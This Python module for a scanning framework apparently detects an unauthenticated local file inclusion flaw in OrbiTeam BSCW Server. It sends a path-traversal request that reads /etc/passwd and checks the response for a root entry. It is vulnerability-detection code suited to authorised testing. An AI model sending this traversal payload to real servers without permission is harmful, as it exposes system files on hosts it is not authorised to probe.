#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""OrbiTeam BSCW Server versions 5."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'OrbiTeam BSCW Server - Local File Inclusion Detection',
        'description': 'OrbiTeam BSCW Server versions 5.0.x, 5.1.x, 5.2.4 and below, 7.3.x and below, and 7.4.3 and below are vulnerable to unauthenticated local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'bscw', 'orbiteam', 'lfi', 'unauth', 'packetstorm', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/165156/OrbiTeam-BSCW-Server-XSS-LFI-User-Enumeration.html',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/pub/bscw.cgi/30?op=theme&style_name=../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="OrbiTeam BSCW Server - Local File Inclusion detected",
                path='/pub/bscw.cgi/30?op=theme&style_name=../../../../../../../../etc/passwd',
            )
            return True
        return False

